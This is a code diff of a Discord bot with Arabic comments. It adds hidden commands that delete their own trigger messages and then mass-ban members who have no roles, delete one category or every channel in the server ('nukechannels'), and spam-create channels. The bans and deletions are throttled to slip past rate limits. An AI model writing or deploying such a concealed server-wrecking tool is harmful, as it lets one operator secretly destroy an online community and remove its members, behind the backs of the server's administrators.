@@ -7,13 +7,12 @@ const server = http.createServer((req, res) => {
     res.end('Bot is running successfully!');
 });
 
-// Render تلقائياً بيرسل رقم البورت في الـ Environment، وإذا ما لقاه بنفتح بورت 3000
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`[Render Trick] Dummy server is listening on port ${PORT}`);
 });
 
-// 2️⃣ إعدادات البوت الأساسية وتفعيل كافة الـ Intents المطلوبة
+// 2️⃣ إعدادات البوت الأساسية
 const client = new Client({ 
     intents: [
         GatewayIntentBits.Guilds, 
@@ -30,7 +29,6 @@ client.on('ready', () => {
 });
 
 client.on('messageCreate', async (message) => {
-    // تجاهل الرسائل التي لا تبدأ بالنقطة أو الصادرة من بوتات
     if (!message.content.startsWith(PREFIX) || message.author.bot) return;
 
     // 🔒 نظام الأمان الصارم باستخدام الـ ID الخاص بك مباشرة
@@ -43,37 +41,27 @@ client.on('messageCreate', async (message) => {
     // 1️⃣ أمر التبنيد الجماعي المخفي: .banall 50 أو .banall 100
     if (command === 'banall') {
         const count = parseInt(args[1]);
-        if (isNaN(count) || count <= 0) return; // تجاهل الأمر لو لم يتم تحديد رقم صحيح
+        if (isNaN(count) || count <= 0) return;
+
+        try { await message.delete(); } catch (err) {}
 
         try {
-            await message.delete(); // حذف رسالة الأمر فوراً لإخفائه
-        } catch (err) {
-            console.error("لم يتمكن البوت من حذف الرسالة (نقص صلاحيات):", err);
-        }
-
-        try {
-            // جلب كافة أعضاء السيرفر وتحديث الكاش
             const members = await message.guild.members.fetch();
-            
-            // فلترة الأعضاء: ليس بوت، وليس لديه رتب إضافية (رتبة @everyone فقط لحماية الحقيقيين)
             const targets = members.filter(m => !m.user.bot && m.roles.cache.size <= 1).first(count);
 
             if (targets.length === 0) return;
 
-            // تنفيذ التبنيد حبة حبة بالـ Delay المطلوبة (20 ثانية) عشان الأمان الكامل
             for (const member of targets) {
                 try {
-                    await member.ban({ reason: 'تنظيف الحسابات غير القانونية والمخالفة' });
+                    await member.ban({ reason: 'تنظيف الحسابات غير القانونية' });
                     console.log(`تم بنجاح تبنيد العضو: ${member.user.tag}`);
-                    
-                    // الانتظار لمدة 20 ثانية قبل الانتقال للعضو التالي لمنع الـ Rate Limit تماماً
-                    await new Promise(resolve => setTimeout(resolve, 20000)); 
+                    await new Promise(resolve => setTimeout(resolve, 20000)); // ديلاي 20 ثانية
                 } catch (banError) {
                     console.error(`فشل تبنيد ${member.user.tag}:`, banError);
                 }
             }
         } catch (fetchError) {
-            console.error("حدث خطأ أثناء جلب الأعضاء:", fetchError);
+            console.error(fetchError);
         }
     }
 
@@ -82,38 +70,77 @@ client.on('messageCreate', async (message) => {
         const categoryId = args[1];
         if (!categoryId) return;
 
-        try {
-            await message.delete(); // حذف رسالة الأمر فوراً
-        } catch (err) {
-            console.error("لم يتمكن البوت من حذف الرسالة:", err);
-        }
+        try { await message.delete(); } catch (err) {}
 
         try {
             const category = message.guild.channels.cache.get(categoryId);
             if (!category || category.type !== ChannelType.GuildCategory) return;
 
-            // جلب كافة الرومات التابعة لهذه الكاتيجوري
             const children = category.children.cache;
 
-            // مسح الرومات الداخلية أولاً
             for (const [id, channel] of children) {
                 try {
                     await channel.delete();
-                    await new Promise(resolve => setTimeout(resolve, 1000)); // ديلاي ثانية بين الرومات
-                } catch (chanErr) {
-                    console.error(`فشل حذف الروم ${channel.name}:`, chanErr);
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                } catch (chanErr) {}
+            }
+            await category.delete();
+        } catch (catError) {}
+    }
+
+    // 3️⃣ أمر تصفير السيرفر (حذف كاااااافة الرومات والكاتيجوريز بالسيرفر)
+    if (command === 'nukechannels') {
+        try { await message.delete(); } catch (err) {}
+
+        try {
+            // جلب كل رومات السيرفر
+            const channels = await message.guild.channels.fetch();
+            
+            for (const [id, channel] of channels) {
+                try {
+                    await channel.delete();
+                    // ديلاي ثانية واحدة بين كل روم وروم عشان ما نبلع ليمتد وتتم العملية بسلاسة
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                } catch (err) {
+                    console.error(`فشل حذف الروم ${channel.name}`);
                 }
             }
+            console.log("تم مسح جميع رومات السيرفر بنجاح!");
+        } catch (error) {
+            console.error(error);
+        }
+    }
 
-            // مسح الكاتيجوري نفسها بعد تفريغها
-            await category.delete();
-            console.log(`تم حذف الكاتيجوري ${category.name} بالكامل بنجاح.`);
+    // 4️⃣ أمر إنشاء عدد معين من الرومات بنفس الاسم (الحد الأقصى 50)
+    if (command === 'makechannels') {
+        const count = parseInt(args[1]); // العدد
+        const channelName = args.slice(2).join('-'); // اسم الروم
 
-        } catch (catError) {
-            console.error("حدث خطأ أثناء حذف الكاتيجوري:", catError);
+        if (isNaN(count) || count <= 0 || !channelName) return;
+        
+        // قفل أمان لحمايتك: إذا حدد أكتر من 50 يخليهم 50 تلقائياً
+        const finalCount = count > 50 ? 50 : count;
+
+        try { await message.delete(); } catch (err) {}
+
+        try {
+            for (let i = 0; i < finalCount; i++) {
+                try {
+                    await message.guild.channels.create({
+                        name: channelName,
+                        type: ChannelType.GuildText // رومات كتابية عادية، تقدر تعدلها لـ GuildVoice لو تبيها صوتية
+                    });
+                    // ديلاي ثانية واحدة لمنع الليمتد أثناء التكراير
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                } catch (createErr) {
+                    console.error("فشل إنشاء الروم:", createErr);
+                }
+            }
+            console.log(`تم إنشاء ${finalCount} روم باسم ${channelName} بنجاح!`);
+        } catch (error) {
+            console.error(error);
         }
     }
 });
 
-// البوت يقرأ التوكن تلقائياً من الـ Environment Variables في ريندر
 client.login(process.env.TOKEN);
